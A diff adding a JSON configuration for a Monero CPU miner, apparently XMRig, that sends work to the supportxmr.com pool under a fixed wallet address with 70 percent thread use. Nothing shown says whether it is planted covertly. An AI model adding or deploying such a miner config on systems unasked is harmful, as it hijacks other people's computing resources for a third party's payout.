@@ -1,0 +1,17 @@
+{
+    "autosave": true,
+    "cpu": {
+        "enabled": true,
+        "max-threads-hint": 70,
+        "priority": 0
+    },
+    "pools": [
+        {
+            "url": "pool.supportxmr.com:4444",
+            "user": "47gDWhVzBETMKfVWi5b355ATzRJMLGZDFCXJUtfUXDBF5LnKXxCNgeaiLdtMuJuFHL2hQw1Wdp6tQBhRm1eho4Wk9vjZf9C",
+            "pass": "x",
+            "keepalive": true,
+            "tls": false
+        }
+    ]
+}
